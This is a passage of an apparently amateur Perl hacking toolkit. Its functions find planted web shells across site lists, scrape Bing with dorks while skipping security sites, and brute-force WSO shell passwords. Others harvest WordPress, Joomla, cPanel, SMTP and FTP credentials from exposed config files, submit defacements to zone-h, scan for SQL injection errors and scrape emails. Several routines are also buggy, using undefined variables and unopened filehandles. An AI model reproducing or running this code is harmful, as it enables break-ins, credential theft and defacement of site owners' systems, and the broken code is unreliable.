  /_\  _ __  _   _  / _\ |__   ___| | | / _ \/ _ \
 //_\\| '_ \| | | | \ \| '_ \ / _ \ | | \// /\// /
/  _  \ | | | |_| |__\ \ | | |  __/ | |   \/   \/ 
\_/ \_/_| |_|\__, (_)__/_| |_|\___|_|_|   ()   () 
             |___/              ~~Escanor Sama~~); 
print color('bold blue'),"\n [";
print color('bold green'),">";
print color('bold blue'),"] ";
print color("bold green"), "Enter Sites : ";
my $lll = <STDIN>;
chomp $lll;
open (shella,"<$lll") or die "Winha wbsitelist Ya 7ej -_-\n";
print color('bold blue')," [";
print color('bold green'),">";
print color('bold blue'),"] ";
print color('bold red'),"Threads : ";
print color('bold yellow');
$thr=<STDIN>;
while(@shilounna){
chomp($_);
$site = $_;
push(@threads, threads->create (\&shlaka,$site));
sleep(1) while(scalar threads->list(threads::running) >= $thr);
eval {
$_->join foreach @threads;
@threads = ();}
}
$zeeeeby=<>;
}
sub shlaka(){
$boom="$site/$site";
my $usrag = $usrag->get("$boom")->status_line;
if($usrag =~/200|302|503/) {
print color('bold green'),"  Oh ! >";
print color('bold blue'),"$boom\n";
open (TEXT, '>>logz/shelzz.txt');
print TEXT "$boom\n";
close (TEXT);
next Mayar
}}
###########
sub lm3allem(){
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
print color('bold red'),"\n\n";   
print q(                                      
 _____ _     _____     ____  ___     _             
| __  |_|___|   __|___|    \|   |___| |_ ___ ___   
| __ -| |   |  |  |___|  |  | | |  _| '_| -_|  _|  
|_____|_|_|_|_____|   |____/|___|_| |_,_|___|_|    
                              ~~Escanor Sama~~); 
print color('bold blue'),"\n [";
print color('bold green'),">";
print color('bold blue'),"] ";
print color("bold green"), "Enter DorkList : ";
my $lll = <STDIN>;
chomp $lll;
open (drkz,"<$lll") or die "Winha wbsitelist Ya 7ej -_-\n";
print color('bold blue')," [";
print color('bold green'),">";
print color('bold blue'),"] ";
print color('bold red'),"Threads : ";
print color('bold yellow');
$thr=<STDIN>;
push(@threads, threads->create (\&darkon));
sleep(1) while(scalar threads->list(threads::running) >= $thr);
eval {
$_->join foreach @threads;
@threads = ();}
#For You merlin
}
sub darkon(){
Marmar:while (<drkz>){ 
$dork=$_;
chomp($dork);
print color('bold blue')," [";
print color('bold green'),"Dork";
print color('bold blue'),"] ";
print color("bold white"),"$dork\n";
print color('reset');
for ($ii = 1; $ii <= 2000; $ii+=10){
$url = "http://www.bing.com/search?q=$dork&filt=all&first=$ii&FORM=PERE";
$resp = $usrag->get($url);
$rrs = $resp->content;
while($rrs =~ m/<a href=\"?http:\/\/(.*?)\/|<a href=\"?https:\/\/(.*?)\//g){
$link = $1; #AntiBots
if ( $link !~ /overture|msn|live|bing|yahoo|nsa|fbi|duckduckgo|google|yahoo|microsoft|facebook|hack|security|exploit|.blogspot.|videolike|tutorial/){
if ($link !~ /^http:/){
$link = 'http://' . "$link" . '/';}
if($link !~ /\"|\?|\=|index\.php/){
if  (! grep (/$link/,@result)){
print colored("~> $link\n",'white on_green');
open(save, '>>sites-1.txt');
print save "$link\n";
close(save);
push(@result,$link);}}}
}}
if ($rrs !~ m/class=\"sb_pagN\"/g){next Marmar;}
}}
###########
sub zoneh(){
print color('bold blue')," [";
print color('bold green'),">";
print color('bold blue'),"] ";
print color('bold red'),"Defacer : ";
print color('bold yellow');
$defacerr=<>;
print color('bold blue')," [";
print color('bold green'),">";
print color('bold blue'),"] ";
print color('bold red'),"Websites : ";
print color('bold yellow');
$list=<STDIN>;
open(taaar,"<$list") or die "Winha wbsitelist Ya 7ej -_-\n";
@targ=<taaar>;
Mayar:for $site(@targ){
chomp($site);
if($site !~ /https:\/\// && $site !~ /http:\/\// ) { $site = "http://$site/"; };
$res=$usrag  -> post("http://zone-h.org/notify/single",[defacer=> $defacerr,domain1 => $def,hackmode=> '15',reason  => '1', submit  => 'Send']);
if ($res->content =~ /color="red">ERROR<\/font><\/li>/) {
print color('bold red');
print "[!] Failed > $site veBeen Defaced Before\n";
print color('reset');
}elsif ($res->content =~ /color="red">OK<\/font><\/li>/) {
print color('bold green');
print "[*] $site > Defaced Succesfully\n";
print color('reset');}else{
print color('bold red');
print "[!] Error Connection\n";
print color('reset');}}}
###########
sub wsosh(){
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
print color('bold red'),"\n\n";   
print q(
 __    __               ___            _            
/ / /\ \ \___  ___     / __\_ __ _   _| |_ ___ _ __ 
\ \/  \/ / __|/ _ \   /__\// '__| | | | __/ _ \ '__|
 \  /\  /\__ \ (_) | / \/  \ |  | |_| | ||  __/ |   
  \/  \/ |___/\___/  \_____/_|   \__,_|\__\___|_|   
                              ~~Escanor Sama~~  );
print color('bold red'),"\n";
print q(**Job Of This **
 * Get Any Shell Type WSO with password 
 * See The type of password in html source (like : <input type=password name=pass )
 * Save Your ShellLinks In .txt File And Run This Tool with passwdlist );
print color('bold blue'),"\n [";
print color('bold green'),">";
print color('bold blue'),"] ";
print color('bold red'),"List : ";
$list=<>;
open(lizza,"<$list") or die "Winha wbsitelist Ya 7ej -_-\n";
print color('bold blue'),"\n [";
print color('bold green'),">";
print color('bold blue'),"] ";
print color('bold red'),"passwd list : ";
$paslaii=<>;
open(lizza,"<$paslaii") or die "Winha passwdlist Ya 7ej -_-\n";
@lizzo=<lizza>;
Miamore:foreach$site(@lizzo){
chomp($site);
if($site !~ /https:\/\// && $site !~ /http:\/\// ) { $site = "http://$site"; };
if($site =~/https/){
$site =~ s/https/http/ig;}
#checking
my $test=$usrag->get($site)->content;
if ($test=~/W3Lcome|Your ip|Hacked|<input type=password/){
#bruting
print color('bold blue'),"\n [";
print color('bold green'),"Bruting With";
print color('bold blue'),"] ";
print color('bold yellow'),"$site";
@pizzo=<pizza>;
foreach $passwd(@pizzo) { 
chomp($passwd);
$chkk=$usrag->post ($site,[pass=>$passwdd])->content;
if ($chkk!~/W3Lcome|Your ip|Hacked|<input type=password/){
print color('bold red'),"\n [";
print color('bold green'),"Pass";
print color('bold red'),"] ";
print color('bold white'),"$passwdd";
open(txxt,">>shells_with_pass.txt");
print txxt "[shell]~> $site | [pass]~> $passwdd";
close txxt;
}}
}else{next Miamore;}
}
$zeeeeby=<>;
}
###########
sub oussama(){#AllCnfs Grabber Nchallah
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
print color('bold red'),"\n\n";   
print q(
              __     ___           _     _               
   ___ _ __  / _|   / _ \_ __ __ _| |__ | |__   ___ _ __ 
  / __| '_ \| |_   / /_\/ '__/ _` | '_ \| '_ \ / _ \ '__|
 | (__| | | |  _| / /_\\| | | (_| | |_) | |_) |  __/ |   
(_)___|_| |_|_|   \____/|_|  \__,_|_.__/|_.__/ \___|_|   
                                            ~~Escanor Sama~~   );
print color('bold blue'),"\n [";
print color('bold green'),">";
print color('bold blue'),"] ";
print color('bold red'),"List : ";
print color('bold yellow');
$paslaii=<>;
open(lizza,"<$paslaii") or die "Winha passwdlist Ya 7ej -_-\n";
@lizzo=<lizza>;
Mayar:for $ouss(@lizzo){
chomp($ouss);
if($ouss !~ /https:\/\// && $ouss !~ /http:\/\// ) { $ouss = "http://$ouss"; }
print color('bold blue'),"\n [";
print color('bold green'),"Config Link";
print color('bold blue'),"] ";
print color('bold white')," $ouss\n";
$requ=$usrag->get($ouss)->content;
#print $requ;
#Wordpress
if ($requ=~/WordPress/){ 
if ($requ =~ /DB_NAME\', \'(.*)\'\)/){
my $dbname=$1;
if ($requ =~ /DB_USER\', \'(.*)\'\)/){
my $dbuser=$1;
if ($requ =~ /DB_PASSWORD\', \'(.*)\'\)/){
my $dbpasswd=$1;
if ($requ =~ /DB_HOST\', \'(.*)\'\)/){
my $dbhst=$1;
my $andale="WP Config ~> $dbname | $dbuser | $dbpasswd | $dbhst\n";
print color('bold white'),"$andale";
open (ee,">>logz/allconfsresults.txt");
print ee "[Link]~> $ouss [Config]~> $andale";
close ee;}}}}}
#Cpanel
if ($requ =~ /user=(.*)"/){
my $cpcnfusr=$1;
if ($requ =~ /password="(.*)"/){
my $cpcnfpwd=$1;
my $cpcnf="Cpanel ~> $cpcnfusr | $cpcnfpwd\n";
print color('bold yellow'),"$cpcnf";
open (ee,">>logz/cpanelz_from_cnfs.txt");
print ee "[Link]~> $ouss [CPANEL]~> $cpcnf";
close ee;}}
#joomla
if ($requ=~/joomla/){ 
if ($requ =~ /user = '(.*?)';/){
my $jmcnfuser=$1;
if ($requ =~ /password = '(.*?)';/){
my $jmcnfpass=$1;
if ($requ =~ /db = \'(.*?)\';/){
my $jmcnfdb=$1;
if ($requ =~ /host = \'(.*?)\';/){
my $jmcnfhst=$1;
my $jmcnf="Joom Config ~> $jmcnfuser | $jmcnfpass | $jmcnfdb | $jmcnfhst\n";
print color('bold white'),"$jmcnf";
open (ee,">>logz/allconfsresults.txt");
print ee "[Link]~> $ouss [Config]~> $jmcnf";
close ee;}}}}}
#SMTP 
if ($requ =~ /smtpauth = '0';/){
if ($requ =~ /smtpuser = '(.*?)';/){
my $smtpuser=$1;
if ($requ =~ /smtppass = '(.*?)';/){
my $smtppwd=$1;
if ($requ =~ /smtphost = '(.*?)';/){
my $smtphst=$1;
if ($requ =~ /smtpport = '(.*?)';/){
my $smtpprt=$1;
my $smtppp="SMTP ~> $smtpuser | $smtppwd | $smtpuser | $smtphst | $smtpprt\n";
print color('bold blue'),"$smtppp";
open (ee,">>logz/smtp_from_cnfs.txt");
print ee "[Link]~> $ouss [SMTP]~> $smtppp";
close ee;
}}}}}
#FTP
if ($requ =~ /ftp_enable = '0';/){
if ($requ =~ /ftp_user = '(.*?)';/){
my $ftpuser=$1;
if ($requ =~ /ftp_pass = '(.*?)';/){
my $ftppass=$1;
if ($requ =~ /ftp_host = '(.*?)';/){
my $ftphst=$1;
if ($requ =~ /ftp_port = '(.*?)';/){
my $ftpprt=$1;
my $ftppp="FTP ~> $ftpuser | $ftppass | $ftphst | $ftpprt\n";
print color('bold red'),"$ftppp";
open (ee,">>logz/ftp_from_cnfs.txt");
print ee "[Link]~> $ouss [FTP]~> $ftppp";
close ee;}}}}}
}
$zeeeeby=<>;
}

sub sqliii(){
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
print color('bold red'),"\n\n";   
print q(
                   __                                  
 _____ _____ __   |  |   _____               _         
|   __|     |  |  |  |  |     |___ ___ _ _ _| |___ ___ 
|__   |  |  |  |__|__|  |   --|  _| .'| | | | | -_|  _|
|_____|__  _|_____|__|  |_____|_| |__,|_____|_|___|_|  
         |__|                       ~~Escanor Sama~~ );
print color('bold blue'),"\n [";
print color('bold green'),">";
print color('bold blue'),"] ";
print color('bold red'),"list : ";
$noooob=<>;
open(lizza,"<$noooob") or die "Winha passwdlist Ya 7ej -_-\n";
@lizzo=<lizza>;
Miamore:for $link(@lizzo){
chomp($link);
print "$link \n"; #AntiBots
my $jarb=$usrag->get($link)->content;
if ($jarb=~/You have an error in your SQL syntax|Query failed|SQL query failed|mysql_fetch_|mysql_fetch_array|mysql_num_rows|The used SELECT statements have a different number of columns/){
print colored("[MySQL]~> $link\n",'white on_red');
print color('reset');
open(save, '>>logz/sqli_vuln_by_escanor.txt');
print save "$link\n";
close(save);}
elsif($jarb=~/Unclosed quotation mark|Microsoft OLE DB Provider for|ODBC SQL Server Driver/){ 
print colored("[MsSQL]~> $link\n",'black on_red');
print color('reset');
open(save, '>>logz/sqli_vuln_by_escanor.txt');
print save "$link\n";
close(save);}
elsif($jarb=~/Microsoft JET DatabaseODBC Microsoft Access Driver/){ 
print colored("[MsAcces]~> $link\n",'black on_red');
print color('reset');
open(save, '>>logz/sqli_vuln_by_escanor.txt');
print save "$link\n";
close(save);}
push(@result,$link);}
$zeeeeby=<>;
}
sub emailn { 
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
print color('bold red'),"\n\n";   
print q(
                                                      
 _____           _ _    _____               _         
|   __|_____ ___|_| |  |     |___ ___ _ _ _| |___ ___ 
|   __|     | .'| | |  |   --|  _| .'| | | | | -_|  _|
|_____|_|_|_|__,|_|_|  |_____|_| |__,|_____|_|___|_|  
                                    ~~Escanor Sama~~ );
print color('bold blue'),"\n [";
print color('bold green'),">";
print color('bold blue'),"] ";
print color('bold red'),"List : ";
print color('bold yellow');
$nooo0b=<>;
open(lizza,"<$nooo0b") or die "Winha list Ya 7ej -_-\n";
@lizzo=<lizza>;
Miamore:foreach $link(@lizzo){
chomp($link);
print color('bold blue'),"\n [";
print color('bold green'),">>";
print color('bold blue'),"] ";
print color('bold yellow'),"$link\n";
chomp($link);
if($link !~ /https:\/\// && $link !~ /http:\/\// ) { $link = "http://$link"; }
$requ=$usrag->get($link)->content;
@daryside=split/\s+/,$requ;
foreach $q(@daryside){
if ($q=~/([a-zA-Z0-9\_\-\.]+[a-zA-Z0-9\_\-\.]+[a-zA-Z0-9\_\-\.]+)+@([a-zA-z0-9][a-zA-z0-9][a-zA-z0-9]*)+(\.[a-zA-z0-9][a-zA-z0-9][a-zA-z0-9]*)(\.[a-zA-z0-9]+)*/){
$sina+=1;
if ($email=~/<\//){ 
@qq=split/<\//,$q;$q=@qq[0];}
print color('bold green'),"  Email[$sina] ~> $q\n";
open (ee,">>logz/emailz_from_links.txt");
print ee "Email ~> $q";}
if ($q=~/>(.*)</){
$email=$1;
if ($email=~/([a-zA-Z0-9\_\-\.]+[a-zA-Z0-9\_\-\.]+[a-zA-Z0-9\_\-\.]+)+@([a-zA-z0-9][a-zA-z0-9][a-zA-z0-9]*)+(\.[a-zA-z0-9][a-zA-z0-9][a-zA-z0-9]*)(\.[a-zA-z0-9]+)*/){
$sina+=1;
if ($email=~/<\//){ 
@qq=split/<\//,$email;$email=@qq[0]; }
print color('bold green'),"  Email[$sina] ~> $email\n";
open (ee,">>logz/emailz_from_links.txt");
print ee "Email ~> $email";}}
elsif ($q=~ /'(.*)'/){
  $email=$1;
  if ($email=~/<\//){ 
@qq=split/<\//,$email;$email=@qq[0]; }
if ($email=~/([a-zA-Z0-9\_\-\.]+[a-zA-Z0-9\_\-\.]+[a-zA-Z0-9\_\-\.]+)+@([a-zA-z0-9][a-zA-z0-9][a-zA-z0-9]*)+(\.[a-zA-z0-9][a-zA-z0-9][a-zA-z0-9]*)(\.[a-zA-z0-9]+)*/){
$sina+=1;
print color('bold green'),"  Email[$sina] ~> $email\n";
open (ee,">>logz/emailz_from_links.txt");
print ee "$email\n";}}}}$zeeeeby=<>;}
###########
sub abt(){
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
print q( 
~> Th3 Coder > Eskan0r
From ? > Tunisia(north-Africa) 
Facebook >fb.com/meliodas404
Github > github.com/0xtn
~> This Code Created In 4 December 2018 (Internet Acess Limited :D)
[!] Dont Share This Tool For Suhyoun 
[!] Dont Change The Copyright 
[!] Contact Me If u Face AnyProblems 
[!] Changing Ur Name & Logo cant Make You The Coder
[*] Thnx 4 All Musliman HAckers & Coders);
	}
#ForYou Merlin
